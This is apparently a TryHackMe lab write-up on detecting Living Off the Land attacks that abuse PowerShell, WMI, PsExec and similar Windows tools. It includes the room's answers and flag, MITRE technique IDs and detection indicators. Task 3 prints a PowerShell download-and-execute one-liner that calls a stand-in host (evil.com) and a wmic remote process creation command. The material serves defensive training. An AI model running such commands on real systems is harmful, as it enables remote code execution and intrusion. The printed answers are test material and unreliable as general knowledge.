# Living Off the Land Attacks - TryHackMe

> Learn to detect and analyse Living Off the Land attacks using trusted Windows tools

**Room Link:** https://tryhackme.com/room/livingoffthelandattacks

<img width="1454" height="727" alt="image" src="https://github.com/user-attachments/assets/f98b1af5-c5fe-4866-a88b-7e4e6624b005" />

---

## Task 1: Introduction

### What is Living Off the Land (LOL)?

**Definition:** Using legitimate system tools for malicious purposes

**Why attackers use it:**
- Evade detection
- Bypass security controls
- Blend with normal activity
- No malware upload needed

**Common tools:**
- PowerShell
- WMI
- PsExec
- Certutil
- Regsvr32

### Questions

**Q1: Which public site lists Unix/Linux native binaries and how they can be abused?**

Resource for Linux LOL binaries.

- Answer: `GTFOBins`

---

**Q2: Which Microsoft toolset includes PsExec and Autoruns?**

Admin tools often misused by attackers.

- Answer: `Sysinternals`

---

## Task 2: Common LoL Tools and Techniques

### Windows Management Instrumentation (WMI)

**Uses:**
- Remote command execution
- Event subscriptions
- Persistence mechanism

**MITRE ATT&CK:** T1546.003

### Remote Services

**SMB (Server Message Block):**
- File sharing protocol
- Remote service execution
- Used by C2 frameworks like Cobalt Strike

### Questions

**Q1: MITRE technique ID for WMI event subscriptions?**

- Answer: `T1546.003`

---

**Q2: Service abbreviated name used by C2s to start remote services?**

Protocol for file sharing and remote execution.

- Answer: `SMB`

---

## Task 3: Real-World Examples

### PowerShell

**IEX (Invoke-Expression):**
- Download and execute scripts
- Fileless malware delivery
- Memory-only execution

**Example:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
```

### WMIC

**Remote execution:**
```cmd
wmic /node:TARGET process call create "malicious.exe"
```

### Questions

**Q1: PowerShell switch to download and execute text/strings?**

- Answer: `IEX`

---

**Q2: WMIC keyword to create new process on remote host?**

- Answer: `create`

---

## Task 4: Detecting LOL Activity

### Detection Methods

**Monitor:**
- PowerShell execution logs
- WMI activity
- Remote service creation
- Command-line arguments
- Network connections from system tools

**Red flags:**
- PowerShell with IEX
- WMIC remote execution
- Unusual parent-child processes
- Encoded commands
- System tools making network connections

**No questions for this task**

---

## Task 5: Practical

### Hands-On Exercise

Apply detection techniques to identify LOL attacks.

**Q: What is the flag?**

Complete the practical exercises.

- Answer: `THM{LOL-but-not-that-lol-you-finishit}`

---

## Task 6: Wrapping Up

**No answer needed**

---

## Quick Reference

### Common LOL Binaries

| Tool | Purpose | Abuse |
|------|---------|-------|
| **PowerShell** | Scripting | Download & execute malware |
| **WMI** | Management | Remote execution, persistence |
| **PsExec** | Remote admin | Lateral movement |
| **Certutil** | Certificate tool | Download files |
| **Regsvr32** | DLL registration | Execute scripts |
| **Mshta** | HTML apps | Run malicious code |


### Detection Indicators

**PowerShell:**
- `-enc` (encoded)
- `IEX` or `Invoke-Expression`
- `DownloadString`
- `Net.WebClient`

**WMI:**
- `wmic process call create`
- Event subscriptions
- Remote namespace access

**Network:**
- System tools connecting to internet
- Unusual outbound connections
- SMB to external IPs

### MITRE ATT&CK

**T1546.003:** Event Triggered Execution: WMI Event Subscription

**T1059.001:** Command and Scripting Interpreter: PowerShell

**T1021.002:** Remote Services: SMB/Windows Admin Shares

---

## Key Takeaways

- **LOL attacks** use legitimate tools
- **GTFOBins** for Unix/Linux binaries
- **Sysinternals** includes PsExec, Autoruns
- **T1546.003** is WMI event subscriptions
- **SMB** used by C2 frameworks
- **IEX** downloads and executes code
- **WMIC create** spawns remote processes
- **Monitor command-line** arguments
- **PowerShell logs** reveal suspicious activity
- **System tools** shouldn't connect externally
- **Blend detection** with baseline behavior

Happy hunting
